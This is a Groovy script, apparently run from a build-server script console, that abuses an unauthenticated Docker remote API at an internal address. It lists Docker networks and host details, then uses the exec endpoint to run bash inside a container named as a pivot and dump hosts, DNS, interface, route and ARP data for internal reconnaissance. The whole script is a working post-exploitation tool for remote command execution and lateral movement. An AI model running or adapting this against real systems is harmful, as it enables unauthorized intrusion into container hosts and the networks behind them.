// Docker networks + host info + exec helper + network recon in pivot02
dockerApi = "http://172.27.140.148:4243"

def httpGet(String urlStr) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("GET")
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(15000)
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(30000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) {
        conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    }
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

// Exec command in container, return raw output (Tty=true => raw stream)
def execIn(String containerId, String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

println "=== DOCKER NETWORKS ==="
def nets = httpGet(dockerApi + "/networks")
println "HTTP " + nets.code
println nets.body

println ""
println "=== DOCKER INFO (resumen) ==="
def info = httpGet(dockerApi + "/info")
if (info.code == 200) {
    def j = new groovy.json.JsonSlurper().parseText(info.body)
    println "Name: " + j.Name
    println "ServerVersion: " + j.ServerVersion
    println "Driver: " + j.Driver
    println "Containers: " + j.Containers + " (running: " + j.ContainersRunning + ", stopped: " + j.ContainersStopped + ")"
    println "Images: " + j.Images
    println "IPv4Forwarding: " + j.IPv4Forwarding
    println "BridgeNfIptables: " + j.BridgeNfIptables
    println "HttpProxy: " + j.HttpProxy
    println "Plugins.Network: " + j.Plugins?.Network
} else {
    println "HTTP " + info.code + ": " + info.body
}

println ""
println "=== PIVOT02 NETWORK RECON ==="
println execIn("5b32e909c295", 'echo "--- /etc/hosts ---"; cat /etc/hosts; echo "--- /etc/resolv.conf ---"; cat /etc/resolv.conf; echo "--- hostname ---"; hostname; hostname -i 2>/dev/null; echo "--- ip addr ---"; (ip addr 2>/dev/null || ifconfig 2>/dev/null || cat /proc/net/fib_trie 2>/dev/null | head -50); echo "--- ip route ---"; (ip route 2>/dev/null || route -n 2>/dev/null || cat /proc/net/route); echo "--- arp ---"; (ip neigh 2>/dev/null || arp -a 2>/dev/null || cat /proc/net/arp)')
